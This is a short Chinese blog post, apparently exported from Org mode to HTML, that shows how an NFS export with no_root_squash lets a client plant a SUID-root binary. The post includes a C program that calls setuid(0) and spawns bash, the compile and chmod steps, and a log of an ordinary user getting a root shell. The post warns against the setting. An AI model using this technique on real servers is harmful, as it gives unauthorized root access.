@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<!-- 2020-09-10 四 00:43 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>利用nfs no_root_squash获取root权限</title>
+<meta name="generator" content="Org mode">
+<meta name="author" content="schspa">
+<meta name="description" content="nfs-rootsquash.org"
+>
+<meta name="keywords" content="nfs">
+<link rel="shortcut icon" href="/images/rose-red.png"
+type="image/x-icon" /><link rel="stylesheet" href="/css/animate.min.css" /><link rel="stylesheet" href="/css/all.min.css" /><link rel="stylesheet" type="text/css" href="/css/style.css" /><script src="/js/jquery.min.js"></script><script src="/js/darkreader.js"></script><script src="/user.config.js"></script><script src="/js/main.js"></script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">利用nfs no_root_squash获取root权限</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgda2e8b1">no_root_squash</a></li>
+<li><a href="#org908a22f">系统环境说明</a>
+<ul>
+<li><a href="#org97a407e">Host NFS配制选项</a></li>
+<li><a href="#orga4c08ae">Guest OS挂载选项</a></li>
+</ul>
+</li>
+<li><a href="#org7000841">通过no_root_squash来获取root权限</a>
+<ul>
+<li><a href="#org4240e12">准备一个C程序，用来获取root权限</a></li>
+<li><a href="#org78ce56d">编译,在Host Computer中给binary添加SUID标志</a></li>
+<li><a href="#org268fe65">到nfs服务器上以普通用户身份运行</a></li>
+<li><a href="#org0e54ebd">成功获取root权限</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgda2e8b1" class="outline-2">
+<h2 id="orgda2e8b1">no_root_squash</h2>
+<div class="outline-text-2" id="text-orgda2e8b1">
+<p>
+nfs服务器配置时,很多人并不注意其中的安全选项，直接写上no_root_squash标志。<br>
+需要注意的是，如果写上这个标志，等于直接将系统的root权限分享给了共享者。下面通过一个实例来演示如何通过no_root_squash标志来获取系统的root权限。<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org908a22f" class="outline-2">
+<h2 id="org908a22f">系统环境说明</h2>
+<div class="outline-text-2" id="text-org908a22f">
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-right">
+
+<col  class="org-left">
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left">PC</td>
+<td class="org-right">Address</td>
+<td class="org-left">OS</td>
+</tr>
+
+<tr>
+<td class="org-left">Remote Server</td>
+<td class="org-right">10.106.58.18</td>
+<td class="org-left">Ubuntu 18.04</td>
+</tr>
+
+<tr>
+<td class="org-left">Host Computer</td>
+<td class="org-right">10.106.22.126</td>
+<td class="org-left">Arch Linux</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div id="outline-container-org97a407e" class="outline-3">
+<h3 id="org97a407e">Host NFS配制选项</h3>
+<div class="outline-text-3" id="text-org97a407e">
+<div class="org-src-container">
+<pre class="src src-bash">/home/xxx/share/nfs *(sync,rw,no_root_squash,no_subtree_check)
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orga4c08ae" class="outline-3">
+<h3 id="orga4c08ae">Guest OS挂载选项</h3>
+<div class="outline-text-3" id="text-orga4c08ae">
+<div class="org-src-container">
+<pre class="src src-bash">sudo mount -t nfs4 10.106.58.18:/home/xxx/share/nfs aaa
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org7000841" class="outline-2">
+<h2 id="org7000841">通过no_root_squash来获取root权限</h2>
+<div class="outline-text-2" id="text-org7000841">
+</div>
+<div id="outline-container-org4240e12" class="outline-3">
+<h3 id="org4240e12">准备一个C程序，用来获取root权限</h3>
+<div class="outline-text-3" id="text-org4240e12">
+<p>
+内容如下，直接跑命令进入shell就行<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-C"><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;stdio.h&gt;</span>
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;stdlib.h&gt;</span>
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;unistd.h&gt;</span>
+
+<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span>(<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">argc</span>, <span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">argv</span>[])
+{
+
+    (<span style="color: #ECBE7B;">void</span>) argc;
+    (<span style="color: #ECBE7B;">void</span>) argv;
+
+    printf(<span style="color: #98be65;">"real uid\t %d\n"</span>,getuid());
+    printf(<span style="color: #98be65;">"effective uid\t %d\n"</span>,geteuid());
+    <span style="color: #51afef;">if</span>(setuid(0) == -1)
+    {
+        perror(<span style="color: #98be65;">"setuid(0) failed"</span>);
+    }
+
+    <span style="color: #51afef;">return</span> system(<span style="color: #98be65;">"bash"</span>);
+}
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org78ce56d" class="outline-3">
+<h3 id="org78ce56d">编译,在Host Computer中给binary添加SUID标志</h3>
+<div class="outline-text-3" id="text-org78ce56d">
+<div class="org-src-container">
+<pre class="src src-bash"><span style="color: #c678dd;">cd</span> aaa
+gcc test.c -o test.bin
+sudo chmod root:root test.bin
+sudo chmod u+s test.bin
+ls -al test.bin 
+-rwsr-xr-x 1 root root 16744  8&#26376;  8 16:33 test.bin
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org268fe65" class="outline-3">
+<h3 id="org268fe65">到nfs服务器上以普通用户身份运行</h3>
+<div class="outline-text-3" id="text-org268fe65">
+<div class="org-src-container">
+<pre class="src src-bash">test-user@server-70ubs00702:~$ ls -al /home/xxx/share/nfs/test.bin 
+-rwsr-xr-x 1 root root 16744 Aug  8 16:33 /home/xxx/share/nfs/test.bin
+test-user@server-70ubs00702:~$ /home/xxx/share/nfs/test.bin 
+real uid     1001
+effective uid    0
+root@server-70ubs00702:~# id
+<span style="color: #dcaeea;">uid</span>=0(root) <span style="color: #dcaeea;">gid</span>=1001(test-user) <span style="color: #dcaeea;">groups</span>=1001(test-user)
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org0e54ebd" class="outline-3">
+<h3 id="org0e54ebd">成功获取root权限</h3>
+<div class="outline-text-3" id="text-org0e54ebd">
+<p>
+上面已经成功进入uid=0的shell中<br>
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script src="https://utteranc.es/client.js"
+    repo="schspa/schspa.github.io"
+    issue-term="title"
+    label="✨💬✨"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+</script>
+<div class="me">
+  <span><b>Contact me via :)</b><span>
+  <div class="contact">
+    <a id="email" href="mailto:schspa@gmail.com" target="_blank"><i class="fab fa-mailchimp animated heartBeat delay-2s slower"></i></a>
+    <a id="github" href="//github.com/schspa" target="_blank"><i class="fab fa-github animated heartBeat delay-2s slower"></i></a>
+  </div>
+</div>
+
+<div id="jinrishici-sentence" style="font-weight: 700;">虚怀乃若谷，水深则流缓。</div>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+</div>
+</body>
+</html>
